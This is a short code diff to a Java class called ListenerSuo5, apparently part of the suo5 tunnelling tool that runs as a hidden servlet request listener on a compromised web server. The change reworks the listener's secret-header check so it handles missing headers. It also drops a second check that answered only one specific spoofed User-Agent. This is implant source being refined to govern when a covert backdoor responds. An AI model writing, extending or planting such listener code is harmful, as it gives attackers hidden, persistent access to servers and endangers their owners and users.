@@ -55,17 +55,13 @@ public class ListenerSuo5 implements InvocationHandler, Runnable, HostnameVerifi
     private void requestInitialized(Object sre) {
         try {
             Object request = invokeMethod(sre.getClass(), sre, "getServletRequest", new Class[]{}, new Object[]{});
-            if(!((String)invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if(lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object response = getResponse(request);
-            String agent = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"User-Agent"});
             String contentType = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
 
-            if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
-
-                return;
-            }
             if (contentType == null) {
                 return;
             }
